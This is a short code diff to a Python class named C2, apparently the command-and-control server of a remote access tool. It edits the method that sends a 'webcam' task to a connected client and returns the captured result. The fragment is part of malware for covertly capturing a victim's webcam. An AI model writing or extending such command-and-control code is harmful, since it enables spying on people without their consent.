@@ -621,9 +621,9 @@ class C2():
                 result = 'Webcam stream ended'
         else:
             client.send_task({"task": "webcam %s" % args})
-            result = 'Webcam capture complete'
             task = client.recv_task()
             result = task.get('result')
+            client._active.set()
         return result
 
     def session_remove(self, session_id):
